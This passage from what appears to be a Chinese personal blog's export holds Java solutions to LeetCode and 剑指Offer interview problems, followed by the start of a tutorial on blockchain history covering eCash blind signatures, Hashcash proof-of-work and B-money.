class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">WordTrie</span> <span class="variable">wordTrie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WordTrie</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">TrieNode</span> <span class="variable">root</span> <span class="operator">=</span> wordTrie.root;</span><br><span class="line">        <span class="keyword">for</span> (String word :</span><br><span class="line">                words) &#123;</span><br><span class="line">            wordTrie.insert(word);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dfs(board, root, i, j, res, visited);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, TrieNode cur, <span class="type">int</span> i, <span class="type">int</span> j, List&lt;String&gt; res, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur.child[board[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (cur.isEnd) &#123;</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur.isEnd = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dfs(board, cur, i + <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i - <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i, j + <span class="number">1</span>, res, visited);</span><br><span class="line">        dfs(board, cur, i, j - <span class="number">1</span>, res, visited);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">TrieNode</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode[] child;</span><br><span class="line">        <span class="keyword">public</span> String val;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> isEnd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">            isEnd = <span class="literal">false</span>;</span><br><span class="line">            child = <span class="keyword">new</span> <span class="title class_">TrieNode</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                child[i] = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">WordTrie</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">WordTrie</span><span class="params">()</span> &#123;</span><br><span class="line">            root = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">TrieNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                    s.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur.child[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur.child[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur.child[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            cur.isEnd = <span class="literal">true</span>;</span><br><span class="line">            cur.val = s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title=" 39. 组合总和"></a><a href="https://leetcode-cn.com/problems/combination-sum"> 39. 组合总和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        ArrayList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        backtrack(candidates, target, res, <span class="number">0</span>, path);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, List&lt;List&lt;Integer&gt;&gt; res, <span class="type">int</span> i, ArrayList&lt;Integer&gt; path)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i; start &lt; candidates.length; start++) &#123;</span><br><span class="line">            path.add(candidates[start]);</span><br><span class="line">            backtrack(candidates, target - candidates[start], res, start, path);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h3 id="剑指-Offer-59-I-滑动窗口的最大值"><a href="#剑指-Offer-59-I-滑动窗口的最大值" class="headerlink" title="剑指 Offer 59 - I. 滑动窗口的最大值"></a><a href="https://leetcode-cn.com/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof/">剑指 Offer 59 - I. 滑动窗口的最大值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单调队列</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length - k + <span class="number">1</span>];</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[<span class="number">0</span>] = deque.peekFirst();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i - k] == deque.peekFirst()) &#123;</span><br><span class="line">                deque.pollFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">            res[j++] = deque.peekFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="剑指-Offer-16-数值的整数次方"><a href="#剑指-Offer-16-数值的整数次方" class="headerlink" title="剑指 Offer 16. 数值的整数次方"></a><a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">剑指 Offer 16. 数值的整数次方</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">if</span>(n == -<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span> / x;</span><br><span class="line">        <span class="type">double</span> <span class="variable">half</span> <span class="operator">=</span> myPow(x, n / <span class="number">2</span>);</span><br><span class="line">        <span class="type">double</span> <span class="variable">mod</span> <span class="operator">=</span> myPow(x, n % <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> half * half * mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-28-对称的二叉树"><a href="#剑指-Offer-28-对称的二叉树" class="headerlink" title="剑指 Offer 28. 对称的二叉树"></a><a href="https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/">剑指 Offer 28. 对称的二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> helper(root.left, root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> &amp;&amp; root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> || root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root1.val == root2.val &amp;&amp; helper(root1.left, root2.right) &amp;&amp; helper(root1.right, root2.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h3 id="剑指-Offer-61-扑克牌中的顺子"><a href="#剑指-Offer-61-扑克牌中的顺子" class="headerlink" title="剑指 Offer 61. 扑克牌中的顺子"></a><a href="https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof/">剑指 Offer 61. 扑克牌中的顺子</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用set判断重复, 又重复则不可能是顺子; 用max和min记录最大最小值, 如果max - min &lt; 5且没有重复就是顺子;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isStraight</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; repeat = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>, min = <span class="number">14</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(num, max);</span><br><span class="line">            min = Math.min(num, min);</span><br><span class="line">            <span class="keyword">if</span> (repeat.contains(num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            repeat.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max - min &lt; <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><h3 id="剑指-Offer-57-和为s的两个数字"><a href="#剑指-Offer-57-和为s的两个数字" class="headerlink" title="剑指 Offer 57. 和为s的两个数字"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/">剑指 Offer 57. 和为s的两个数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有序用双指针, 无序用map或者set</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            sum = nums[l] + nums[r];</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;nums[l], nums[r]&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h2><h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a><a href="https://leetcode-cn.com/problems/merge-intervals">56. 合并区间</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] merge(<span class="type">int</span>[][] intervals) &#123;</span><br><span class="line">        <span class="type">BitSet</span> <span class="variable">bitSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BitSet</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] interval :</span><br><span class="line">                intervals) &#123;</span><br><span class="line">            <span class="comment">// 比如[1,4]和[5,6]两个区间在数轴上是不连续的，但在BitSet上却是连续的。</span></span><br><span class="line">            <span class="comment">// 乘2是为了让它们从BitSet上看也是不连续的</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> interval[<span class="number">1</span>] * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            bitSet.set(interval[<span class="number">0</span>] * <span class="number">2</span>, tmp, <span class="literal">true</span>);</span><br><span class="line">            max = tmp &gt;= max ? tmp : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; max) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> bitSet.nextSetBit(index);</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> bitSet.nextClearBit(start);</span><br><span class="line">            <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;start / <span class="number">2</span>, (end - <span class="number">1</span>) / <span class="number">2</span>&#125;;</span><br><span class="line">            intervals[count++] = tmp;</span><br><span class="line">            index = end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[count][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            res[i] = intervals[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链技术</title>
    <url>/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="区块链技术1-比特币八卦"><a href="#区块链技术1-比特币八卦" class="headerlink" title="区块链技术1:比特币八卦"></a>区块链技术1:比特币八卦</h1><ul>
<li>理解中本聪比特币白皮书</li>
<li>理解分布式一致性的概念</li>
<li>了解Paxos和Raft</li>
<li>理解以太坊和智能合约</li>
</ul>
<h2 id="区块链的货币属性"><a href="#区块链的货币属性" class="headerlink" title="区块链的货币属性"></a>区块链的货币属性</h2><p>设计一种电子货币，使得它能够像现金一样使用，以及不依赖于第三方组织。首先要考虑：</p>
<ol>
<li>如何生成货币：谁能获得这个货币，获得货币不能太容易，正如必须工作才能获得报酬；</li>
<li>如何将货币与所有者关联起来：现下的环境中，信用卡实名制，现金匿名；</li>
<li>如何保护交易双方：保护卖家，防止买家对支付进行回滚；保护买家，卖家对交易不能抵赖；</li>
<li>如何防止双花（double-spending）：对于现金不存在双重支付的问题，花出去了，就没有了；如果是基于信用的，有可能重花；现实中，人们不是防止重花而是在检测出重花之后加以重罚。数字货币是完全虚拟的货币，也即一串数字就代表一块币，这个数字可以被无穷次的利用，怎么样能够防止双花呢？</li>
<li>如何记账：每一笔交易有据可查，同时保护用户的隐私；</li>
</ol>
<p>参考文献</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">比特币白皮书：一种点对点的电子现金系统 | 巴比特</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://book.8btc.com/master_bitcoin">精通比特币 | 巴比特图书</a></p>
<p>【3】<a href="http://daily.zhihu.com/story/9712661">http://daily.zhihu.com/story/9712661</a></p>
<p>【5】 <a href="https://link.zhihu.com/?target=https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml">https://tech.sina.com.cn/csj/2019-03-12/doc-ihrfqzkc3149537.shtml</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=https://www.weiyangx.com/327991.html">https://www.weiyangx.com/327991.html</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=http://www.tucaod.com/3990.html">http://www.tucaod.com/3990.html</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://www.odaily.com/post/5133445">https://www.odaily.com/post/5133445</a></p>
<h1 id="区块链技术2-电子货币的历史"><a href="#区块链技术2-电子货币的历史" class="headerlink" title="区块链技术2:电子货币的历史"></a>区块链技术2:电子货币的历史</h1><p>主要介绍三种电子货币，分别是eCash、 HashCash和B-money。</p>
<h2 id="eCash"><a href="#eCash" class="headerlink" title="eCash"></a>eCash</h2><p>盲签:一种特殊类型的数字签名。一般数字签名中，签名者知道所签署的消息内容。而在盲签中，签名者对他人（接收者）发来的信息进行签名，接收者首先对原始信息进行盲化，然后发送给签名者；签名者对盲化后的信息进行签名；接收者可以对这个签名后的数据去盲化，最终得到签名者关于原始信息的正确签名。</p>
<p>盲签实例:</p>
<blockquote>
<p>一个托管人想要举行一个秘密的选举，但是投票人不能聚在一起当面匿名投票，只能通过邮寄的方式将选票寄出。每个投票人都非常关心不能泄露自己的投票内容，同时也要求能够确认自己的投票确实用上了。而托管人也希望能够保证只有确定的一些人可以投票。</p>
<p>可以使用一种特殊的信封来实现目的。每个投票人将自己的投票单装入一个复写纸衬底的信封，封好，并且将这个信封装入另外一个大信封，在这个信封的外面有自己的寄回地址。当托管人收到这个有地址的信封时，可以打开大信封，拿出投票人自己封好的有复写纸的信封，然后在不拆封的情况下在信封外签字，此时，通过复写纸，他的签名也传到了投票单上；也即，在不知道投票单具体长什么样的情况下，托管人进行了签字。签好字之后，再将这个有复写纸的信封重新装入一个新的信封，寄回给投票人。投票人可以拆开有复写纸的信封，拿出自己的投票单，然后写好投票内容，在选举的日期寄给托管人，并且不标注任何个人信息。</p>
<p>当托管人收到所有投票人的匿名投票时，他能够通过投票单上的签名确认只有选定的投票人才能投票；而投票人也可以根据只有自己所知道的投票单上的信息（因为投票单是投票人自己所选的）确认自己的投票是否起作用了。</p>
</blockquote>
<p>eCash系统需要有中心银行系统，用户在银行中有存款，可以向银行提取电子货币。为了防止银行系统追踪电子货币的使用情况，用户的隐私情况，可以使用盲签名。分为取款、支付和兑现过程。</p>
<ol>
<li><p>取款过程</p>
<ul>
<li>U （User，用户）用身份认证协议向B（bank，银行）证明身份</li>
<li>U将N份电子现金文件m(内含金额（如100元）、用户ID及唯一的随机数等信息)用不同的盲因子盲化后交给B；（唯一的随机数相当于是现金货币中的编号；）</li>
<li>B随机选择一部分(如：N-1个)文件，向U 索要盲因子，恢复出文件(去盲)，审查内容是否符合要求，如是否所有的文件中都是100元</li>
<li>如果审查通过，B从未审查的文件中任取一份盲签名，并发给U，从U 的帐户中减去相应金额；否则协议终止；（这样，虽然银行对B的100元货币进行了签名，也就是担保，但是银行并不确定B所拥有的货币编号是哪一个，从而无法对用户的消费行为进行跟踪）</li>
<li>U对收到的签名文件去盲，得到电子现金（这个电子现金可以像现金一样使用；而且银行不能追踪；但是用户可以自己保存并记录，以在特殊情况下，证明这张钞票的去向，譬如贿赂等犯罪场景）。</li>
</ul>
</li>
<li><p>支付</p>
<ul>
<li>U 与C交易时，把电子现金交给C</li>
<li>C验证B的签名，如是伪造的，则拒收；否则进一步检测用户(可选)，通过后接受电子现金，提供等价的服务。</li>
</ul>
</li>
<li><p>取款</p>
<ul>
<li>C向B递交电子现金和帐户信息</li>
<li>B验证签名，若是伪造的，则拒收；否则查询数据库是否有相同的签名(防止重复使用电子现金)，若找到则C或U 重用电子现金，拒收；否则接受，在C的帐户中加上相应金额，在数据库中添加签名。</li>
</ul>
</li>
</ol>
<h2 id="HashCash"><a href="#HashCash" class="headerlink" title="HashCash"></a>HashCash</h2><p>维基百科:</p>
<blockquote>
<p>“哈希现金（Hashcash）是一种用于防止垃圾电子邮件和拒绝服务攻击的工作量证明系统，最近以其在比特币（以及其他加密货币）挖矿算法中的应用而闻名，由Adam Back于1997年3月提出。”</p>
</blockquote>
<p>HashCash主要思路:</p>
<p>通过要求在邮件发送之前，必须进行计算，譬如，通过对一封电子邮件进行哈希得到指定的包含一些字符串的散列值，证明为了发送邮件，计算机确实花费了一些时间或能量在特定的算法上，从而“证明”这是合法的邮件。</p>
<p>具体实现:</p>
<p>标题行看起来像这样：</p>
<p><code>X-Hashcash: 1:20:1303030600:adam@cypherspace.org::McMybZIhxKXu57jd:ckvi</code></p>
<p>标题包含:</p>
<ul>
<li>ver：Hashcash格式版本1（取代版本0）。</li>
<li>bits：散列代码中的零的位数。</li>
<li>date：发送消息的时间，格式为YYMMDD [hhmm [ss]]。</li>
<li>resource：接收方，例如IP地址或电子邮件地址。</li>
<li>ext：扩展（可选；在版本1中忽略）。</li>
<li>rand：随机字符串，以base-64格式编码。</li>
<li>counter：二进制计数器，以base-64格式编码。</li>
</ul>
<p>发送方具体操作:</p>
<p>发送方准备标题头并附加上初始化为随机数的计数器值（counter）。然后它计算头的160位SHA-1哈希值。如果散列的前20位（即5个最高有效十六进制数字）都是零，那么这是可接受的标题头。如果不是，则发送方递增计数器并再次尝试散列。在2^160个可能的散列值中，有2^140个散列值满足此标准。因此，随机选择将具有20个零作为散列开头的标题的机会是2^20分之一（2^20大约10^6，或大约百万分之一）。发送者需要尝试以获取有效哈希值的次数符合几何分布模型。因此，发送方平均必须尝试2^20个值才能找到有效的标题头。如果合理估计计算哈希所需的时间，则需要大约一秒钟才能找到。没有比这种暴力破解方法更有效的方法来找到有效的标题头。</p>
<p>普通用户不会因生成Hashcash字符串所需的处理时间而感到明显的问题。但是，垃圾邮件发送者因为发送大量垃圾邮件，会大大减慢速度。</p>
<p>接受者具体操作:</p>
<p>HA-1哈希值（例如，“1：20：060408：<a href="mailto:&#97;&#x64;&#x61;&#109;&#x40;&#99;&#x79;&#112;&#104;&#101;&#x72;&#x73;&#112;&#x61;&#x63;&#x65;&#x2e;&#111;&#x72;&#x67;">&#97;&#x64;&#x61;&#109;&#x40;&#99;&#x79;&#112;&#104;&#101;&#x72;&#x73;&#112;&#x61;&#x63;&#x65;&#x2e;&#111;&#x72;&#x67;</a> :: 1QTjaYd7niiQA &#x2F; sc：ePa”）。这在1 GHz机器上大约需要2微秒，远远少于接收其余电子邮件所需的时间。如果前20位不全为零，则散列无效。 （随着机器处理速度的提高，以后的版本可能需要更多的位为零。）</p>
<p>收件人的计算机检查标题中的日期（例如，“060408”，表示2006年4月8日的日期）。如果不在当前日期的两天内，则无效。 （两天的窗口可以补偿不同系统之间的时钟偏差和网络路由时间。）</p>
<p>收件人的计算机检查哈希字符串中的电子邮件地址是否与收件人注册的任何有效电子邮件地址匹配，或者与收件人订阅的任何邮件列表匹配。如果未找到匹配项，则哈希字符串无效。</p>
<p>收件人的计算机将哈希字符串插入数据库。如果字符串已经在数据库中（表示正在尝试重新使用哈希字符串），则该字符串无效。</p>
<p>如果散列字符串通过所有这些测试，则认为它是有效的散列字符串。所有这些测试所花费的时间和磁盘空间远远少于接收电子邮件的正文内容。</p>
<h2 id="B-money"><a href="#B-money" class="headerlink" title="B-money"></a>B-money</h2><p>在B-Money的想法中，Wei提出了两个协议。</p>
<p>在第一个协议中，每个用户都维护一个数据库（<strong>因为每个人都拥有一份数据库，所以中心机构被移除了</strong>），数据库中记录每一个假名（用户的公钥）中有多少钱。这些信息构成了一个帐簿，重点就是如何更新这些帐簿。</p>
<ol>
